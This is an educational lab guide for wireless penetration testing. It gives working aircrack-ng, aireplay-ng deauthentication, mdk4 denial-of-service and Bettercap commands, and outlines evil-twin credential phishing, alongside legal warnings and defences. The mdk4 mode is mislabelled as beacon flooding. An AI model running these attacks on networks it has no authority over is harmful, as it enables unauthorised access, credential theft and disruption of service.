# 🛠️ Wireless Network Penetration Testing Lab

This lab is good for cybersecurity professionals, students, and hobbyists looking to explore Wi-Fi vulnerabilities in a legal, controlled setup.
You can complete this using [WebSploit Labs](https://websploit.org/).
---

## 📚 Objectives

By the end of this lab, you will:
- Understand wireless protocols and encryption standards (WEP, WPA, WPA2, WPA3).
- Capture and analyze Wi-Fi traffic.
- Perform deauthentication and man-in-the-middle (MITM) attacks.
- Crack wireless passwords using captured handshakes.
- Set up rogue access points and detect them.

---

## 🧰 Lab Requirements

### Hardware
- A computer with a compatible wireless network adapter that supports **monitor mode** and **packet injection**.
  - Recommended: Alfa AWUS036ACH or TP-Link TL-WN722N v1
- (Optional but useful) A second Wi-Fi device (laptop or phone) to act as a victim/client.

HOWEVER!!!: You can also use the `mac80211_hwsim` kernel module. The `mac80211_hwsim` is a software simulator of 802.11 radio(s). You can learn more about how to set this up [here](https://github.com/The-Art-of-Hacking/h4cker/blob/master/wireless_resources/virtual_adapters.md).


### Software
- **Kali Linux** (Bare-metal or VM, fully updated)
- Tools:
  - `aircrack-ng`
  - `Wireshark`
  - `hostapd`
  - `dnsmasq`
  - `mdk4`
  - `Bettercap`
  - `EvilAP`, `Wifiphisher`, or `Fluxion`

---

## 🏗️ Lab Setup

### 1. **Install Kali Linux**
Install or boot into Kali Linux. Make sure your Wi-Fi adapter is recognized using:

```bash
iwconfig
```

### 2. **Put the Adapter in Monitor Mode**

```bash
airmon-ng check kill
airmon-ng start wlan0
```

> Replace `wlan0` with your interface name.

---

## 🧪 Lab Exercises

### 🔹 Exercise 1: Wi-Fi Reconnaissance

```bash
airodump-ng wlan0mon
```
- Identify nearby networks (SSID, BSSID, channel).
- Pick a target network for testing (preferably your own test AP).

---

### 🔹 Exercise 2: Capturing a WPA/WPA2 Handshake

```bash
airodump-ng -c [channel] --bssid [BSSID] -w capture wlan0mon
```
- In another terminal:

```bash
aireplay-ng --deauth 10 -a [router BSSID] -c [client MAC] wlan0mon
```

- Crack with:

```bash
aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
```

---

### 🔹 Exercise 3: Evil Twin Attack (Rogue AP)

- Use `hostapd`, `dnsmasq`, and `Bettercap` or `Wifiphisher` to mimic a known network.
- Trick clients into connecting.
- Perform credential harvesting or browser phishing.

---

### 🔹 Exercise 4: Wi-Fi DoS with `mdk4`

```bash
mdk4 wlan0mon d
```
- Launch a denial-of-service attack by flooding the airspace with beacon frames.

---

### 🔹 Exercise 5: Wireless MITM with Bettercap

```bash
bettercap -iface wlan0mon
```
- Set up a fake portal, sniff credentials, or manipulate traffic.

---

## ⚠️ Legal & Ethical Use

This lab is **for educational purposes only**. Never target networks or systems without **explicit authorization**. Always test in an isolated lab environment with equipment you own or have permission to use.

---

## 🔒 Defending Against These Attacks

- Use WPA3 if available.
- Enforce strong passphrases.
- Enable client isolation.
- Use 802.1x with certificates (Enterprise Wi-Fi).
- Monitor for rogue APs and unusual MAC activity.

---

## 🌐 Resources

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [Bettercap Wiki](https://github.com/bettercap/bettercap/wiki)
- [Fern Wi-Fi Cracker](https://www.kali.org/tools/fern-wifi-cracker/)

